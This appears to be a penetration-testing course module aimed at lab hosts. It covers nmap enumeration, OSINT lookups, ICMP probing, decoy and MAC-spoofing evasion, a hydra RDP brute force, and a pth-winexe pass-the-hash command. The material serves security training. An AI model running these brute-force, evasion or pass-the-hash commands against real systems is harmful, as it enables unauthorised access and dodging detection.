# Module 3: Hands-on with Network Assessment

---

## 🧪 Performing Network Enumeration

### 🔹 What is Enumeration?

Enumeration is the process of extracting detailed information from a target system such as:

* Usernames
* Password policies
* Network shares
* ARP cache
* Routing tables

---

### 🔹 Nmap Enumeration Commands

#### Basic Script Scan

nmap -sC 172.30.1.21

---

#### SMB Security Mode

nmap --script=smb-security-mode 172.30.1.21

---

#### SMB Share Enumeration

nmap --script=smb-enum-shares 172.30.1.21

---

## 🌐 Working with Open-Source Intelligence (OSINT)

### 🔹 What is OSINT?

OSINT is the process of collecting publicly available information without directly interacting with the target.

---

### 🔍 WHOIS Lookup

* Visit: https://whois.domaintools.com/
* Enter domain name to retrieve:

  * Domain owner
  * Registration details
  * Name servers

---

### 🔍 DNS Enumeration (nslookup)

nslookup
set type=A
[www.microsoft.com](http://www.microsoft.com)

set type=MX
[www.microsoft.com](http://www.microsoft.com)

---

### 🔍 DNS Enumeration using dnsenum

dnsenum --dnsserver 8.8.8.8 [www.microsoft.com](http://www.microsoft.com)

---

## 🔍 Performing Network & Port Scanning

### 🔹 Discover Live Hosts

netdiscover -r 172.30.1.0/24

---

### 🔹 Ping Sweep (Exclude Host)

nmap -sn 172.30.1.0/24 --exclude 172.30.1.20

---

### 🔹 Port Scan

nmap 172.30.1.21

---

## 📡 Exploring ICMP Probing Techniques

### 🔹 ICMP Echo (Ping Scan)

nmap -PE 172.30.1.121

---

### 🔹 ICMP Timestamp Scan

nmap -PP 172.30.1.121

---

### 🔹 ICMP Netmask Request

nmap -PM 172.30.1.121

✔ Used to discover if host responds to ICMP netmask requests

---

## 🕵️ Understanding Common Evasion Techniques

### 🔹 Decoy Scan

nmap -D 172.30.1.122,172.30.1.123 172.30.1.121

✔ Hides attacker IP among decoy IPs

---

### 🔹 MAC Address Spoofing (Nmap)

nmap --spoof-mac 0 172.30.1.121

---

### 🔹 Changing MAC Address Manually

ifconfig eth1 down
macchanger -A eth1
ifconfig eth1 up

---

## 🖥️ Assessing Remote Information Services

### 🔹 Check RDP Port

nmap -p 3389 172.30.1.121

✔ Detects if RDP (Remote Desktop) service is open

---

### 🔹 Brute Force Attack (RDP)

hydra -t 4 -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://172.30.1.121

---

### 🔹 Remote Login using RDP

rdesktop -u Administrator -p password 172.30.1.121

✔ Opens remote desktop session

---

## 🔐 Pass-the-Hash Attack

### 🔹 Using NTLM Hashes for Authentication

pth-winexe -U Administrator%LMhash:NTLMhash //172.30.1.121 cmd

✔ Allows access without knowing plaintext password

---

## ✅ Key Takeaways

* Enumeration reveals critical system information
* OSINT helps gather data passively
* Nmap is essential for scanning and probing
* ICMP techniques help detect live systems
* Evasion techniques help bypass detection
* Misconfigured services (like RDP) can be exploited

---

